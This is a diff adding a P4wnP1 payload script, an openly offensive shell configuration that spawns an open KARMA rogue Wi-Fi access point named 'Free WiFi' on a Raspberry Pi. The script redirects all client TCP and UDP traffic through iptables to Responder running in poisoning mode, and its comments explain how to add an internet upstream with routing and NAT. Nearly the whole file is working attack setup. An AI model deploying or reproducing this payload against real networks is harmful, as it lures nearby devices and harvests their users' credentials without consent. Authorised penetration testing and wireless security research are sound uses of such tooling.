@@ -1,0 +1,137 @@
+#    This file is part of P4wnP1.
+#
+#    Copyright (c) 2017, Marcus Mengs. 
+#
+#    P4wnP1 is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    P4wnP1 is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.
+
+
+
+# Experimental rogue AP payload: using new KARMA modified nexmon firmware to Spawn Open APs
+# =================================================================================================
+#
+# Author: MaMe82
+#
+# The payload brings an OPEN karma enabled rogue Access Point (using a modified nexmon firmware).
+#
+# For now the payload doesn't use upstream internet, thus a default Responder session is
+# running on the WiFi interface (logs at $wdir/Responder/logs) for testing purposes.
+# A DHCP is up (dnsmasq), but not handing out a gateway / DNS. Anyway, this should allow clients
+# to connect.
+#
+# Although this is a test payload, there're options to get Internet upstream. Extending
+# the payload accordingly is left to the user. 
+# Example for upstream:
+#	If RNDIS/CDC ECM is in use on an Internet connected host, this would be a possible
+#	upstream.
+#	F.e. a route could be added to P4wnP1 with `sudo route add -net default gw 172.16.0.2`
+#       and a valid nameserver added to `/etc/resolv.conf` (8.8.8.8 by default).
+#	On the host end, NAT / MASQUERADING or ICS should be enabled for the USB Internet
+#	Interface.
+#       On P4wnP1's end the WiFi DHCP has to be reconfigured to hand out a router option
+#	(currently commented out in /tmp/dnsmasq_wifi.conf), routing has to be enabled
+#	(sudo /bin/bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward') and MASQUERADING enabled
+#	on the new upstream (sudo iptables -t nat -A POSTROUTING -o $actie_interface -j MASQUERADE,
+#	where $active_interface is substituted by the active USB interface usb0/usb1, when used
+#	in the respective payload callbacks). Last but not least, responder should be disabled,
+#	in order to avoid intefering with a real upstream.
+#	
+#
+# As the spawned WiFi is OPEN and somehow "evil", P4wnP1 should be accessed via USB over Ethernet 
+# when attached to a host.
+# Additionally P4wnP1 is accessible via Bluetooth NAP, which allows to run the payload headless
+# (only with power supply, no USB host).
+#
+# hostapd output is logged to /tmp/hostapd.log
+#
+# Creds to: 	Dominic White (singe), Ian de Villiers, Rogan Dawes ... Sensepost
+# ---------	Laurent Gaffie (lgandx)
+#		Matthias Schulz, Danie Wegemer + latest nexmon contributors ;-)
+
+
+# =============================
+# General setup
+# =============================
+
+# every option left out defaults to the valur from setup.cfg
+
+USB_VID="0x1D6B"        # Vendor ID
+USB_PID="0x0237"        # Product ID (reuse from network-only, as USB host sees the same device interfaces)
+
+USE_ECM=true            # enable ECM in case the AP should be used with upstream over this channel
+USE_RNDIS=true          # enable RNDIS in case the AP should be used with upstream over this channel
+USE_HID=false           # no keyboard
+USE_RAWHID=false        # no raw HID
+USE_UMS=false           # no USB Mass Storage
+
+ROUTE_SPOOF=false		# no route spoofing, as this referes to ECM/RNDIS
+WPAD_ENTRY=false		# no WPAD over DHCP, as this referes to ECM/RNDIS
+
+
+BLUETOOTH_NAP=true # enable bluetooth NAP, P4wnP1 will be rechable via IP configured in setup.cfg (BLUETOOTH_NAP_IP)
+
+WIFI_REG=US
+WIFI_ACCESSPOINT=true
+WIFI_ACCESSPOINT_CHANNEL=6
+WIFI_ACCESSPOINT_NAME="Free WiFi"
+WIFI_ACCESSPOINT_AUTH=false 		# we use an OPEN AP, otherwise the Karma attack wouldn't make too much sense
+WIFI_ACCESSPOINT_PSK="placeholder" 	# not used, because we disabled WPA2 PSK auth
+WIFI_ACCESSPOINT_IP="172.24.0.1" 	# IP used by P4wnP1
+WIFI_ACCESSPOINT_NETMASK="255.255.255.0"
+WIFI_ACCESSPOINT_DHCP_RANGE="172.24.0.2,172.24.0.100"	# DHCP Server IP Range
+WIFI_ACCESSPOINT_HIDE_SSID=false	# don't hide ESSID (haven't even tested this for KARMA attack)
+
+WIFI_NEXMON=true # use modified nexmon firmware, to allow an additional monitor interface
+WIFI_NEXMON_BRING_UP_MONITOR_FIRST=true	# we force monitor interface creation before starting hostapd
+
+
+WIFI_ACCESSPOINT_KARMA=true # enables Karma attack with modified nexmon firmware
+WIFI_ACCESSPOINT_KARMA_LOUD=0 # NO EFFECT IN CURRENT FIRMWARE; Send back corresponding beacons only to clients which have sent a probe request (no broadcast of beacons)
+
+									
+AUTOSSH_ENABLED=false # disable AutoSSH reachback, we have no upstream by default
+
+function startResponder()
+{
+	# redirect unicast traffic incoming on wlan0 for every destination to responder (cacth packets sent to our huge subnet ;-) )
+	WIFI_IF="wlan0"
+
+    iptables -t nat -A PREROUTING -i $WIFI_IF -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+    iptables -t nat -A PREROUTING -i $WIFI_IF -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+
+	echo "Starting responder..."
+
+	# delete Responder.db
+	rm $wdir/Responder/Responder.db
+
+	# start responder in screen session
+    screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $WIFI_IF -d -r -w -P"
+
+	touch /tmp/responder_started
+
+	echo "Responder started."
+	
+}
+
+function onAccessPointUp()
+{
+	# This new callback is triggered when the WiFi the intended SSID is assigned to the WiFi interface (usually when hostapd is up and running)
+	# Warning !! Not tested against configurations with hidden SSID
+	# This is called by user root.
+	
+	led_blink 4
+	
+	startResponder
+	
+	led_blink 5
+}
